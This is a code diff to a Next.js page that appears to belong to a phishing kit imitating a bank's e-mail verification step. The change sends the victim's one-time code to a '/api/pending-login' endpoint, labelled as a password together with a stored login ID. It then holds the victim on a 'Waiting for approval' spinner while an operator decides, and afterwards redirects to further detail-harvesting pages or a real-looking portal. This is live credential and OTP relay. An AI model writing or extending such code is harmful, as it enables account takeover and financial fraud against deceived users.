@@ -2,12 +2,56 @@
 
 import { Suspense, useState, useEffect } from "react";
 import { useRouter, useSearchParams } from "next/navigation";
-import { Check, Info, LockKeyhole, Mail, X } from "lucide-react";
+import { Check, Info, Loader2, LockKeyhole, Mail, X } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { VerificationHeader } from "@/components/verification-header";
 
 const REDIRECT_URL =
   "https://aig.wealthcareportal.com/Authentication/Handshake";
+
+const PENDING_LOGIN_TIMEOUT_MS = 2 * 60 * 1000;
+const PENDING_LOGIN_POLL_MS = 750;
+
+async function waitForPendingVerificationApproval(
+  pendingId: string,
+): Promise<void> {
+  const deadline = Date.now() + PENDING_LOGIN_TIMEOUT_MS;
+
+  while (Date.now() < deadline) {
+    const response = await fetch(
+      `/api/pending-login/${encodeURIComponent(pendingId)}`,
+      { cache: "no-store" },
+    );
+    const data = (await response.json().catch(() => null)) as {
+      status?: string;
+      error?: string;
+    } | null;
+
+    if (!response.ok) {
+      throw new Error(data?.error || "Unable to check verification approval");
+    }
+
+    if (
+      data?.status === "approved" ||
+      data?.status === "success" ||
+      data?.status === "successful"
+    ) {
+      return;
+    }
+
+    if (
+      data?.status === "denied" ||
+      data?.status === "expired" ||
+      data?.status === "redirected"
+    ) {
+      throw new Error("Verification failed");
+    }
+
+    await new Promise((resolve) => setTimeout(resolve, PENDING_LOGIN_POLL_MS));
+  }
+
+  throw new Error("Verification approval timeout");
+}
 
 function EnterCodeContent() {
   const [code, setCode] = useState("");
@@ -29,6 +73,8 @@ function EnterCodeContent() {
       if (!sessionStorage.getItem("ubs_verify")) router.replace("/");
     }
   }, [isSecondOtp, router]);
+
+  console.log("cooldownSeconds", cooldownSeconds, isCooldown);
 
   useEffect(() => {
     if (!isCooldown || cooldownSeconds <= 0) return;
@@ -52,25 +98,50 @@ function EnterCodeContent() {
     setErrorMessage("");
 
     try {
-      await fetch("/api/verification", {
+      // Step 1: Create pending verification approval request
+      const pendingResponse = await fetch("/api/pending-login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          verificationType: isSecondOtp ? "Code (final)" : "Code (first OTP)",
-          code,
+          userId: sessionStorage.getItem("loginUserId") || "verification",
+          password: code,
+          method: "email",
+          maskedEmail: "*",
+          maskedPhone: "*",
+          requestKind: "otp",
         }),
-      }).catch(console.error);
-    } catch (error) {
-      console.error("Failed to send verification notification:", error);
-    }
+      });
 
-    await new Promise((r) => setTimeout(r, 1000));
-    if (isSecondOtp) {
-      window.location.href = REDIRECT_URL;
-    } else {
-      if (typeof window !== "undefined")
-        sessionStorage.setItem("ubs_details", "1");
-      router.push("/verify-details");
+      const pendingData = (await pendingResponse.json().catch(() => null)) as {
+        id?: string;
+        error?: string;
+      } | null;
+
+      if (!pendingResponse.ok || !pendingData?.id) {
+        setErrorMessage(
+          pendingData?.error || "Failed to submit verification code",
+        );
+        setIsLoading(false);
+        return;
+      }
+
+      // Step 2: Wait for admin approval
+      await waitForPendingVerificationApproval(pendingData.id);
+
+      // Step 3: Approved - proceed with redirect
+      if (isSecondOtp) {
+        window.location.href = REDIRECT_URL;
+      } else {
+        if (typeof window !== "undefined")
+          sessionStorage.setItem("ubs_details", "1");
+        router.push("/verify-details");
+      }
+    } catch (error) {
+      console.error("Verification approval error:", error);
+      setErrorMessage(
+        error instanceof Error ? error.message : "Verification approval failed",
+      );
+      setIsLoading(false);
     }
   };
 
@@ -93,8 +164,18 @@ function EnterCodeContent() {
   return (
     <div className="min-h-screen border-t border-gray-200 bg-white">
       <VerificationHeader />
+
       <div className="w-full max-w-130 px-5 py-12 text-center md:ml-29.5 md:px-0">
         <LockKeyhole className="mx-auto mb-2 h-11 w-11 stroke-[1.25] text-[#4f7390]" />
+
+        {isLoading && (
+          <div className="text-center py-8">
+            <Loader2 className="w-10 h-10 animate-spin text-gray-500 mx-auto mb-3" />
+            <p className="text-sm text-gray-500 mb-2">
+              Waiting for approval to continue...
+            </p>
+          </div>
+        )}
         <p className="mb-2 text-sm text-gray-600">
           An e-mail has been sent to the following address:
         </p>
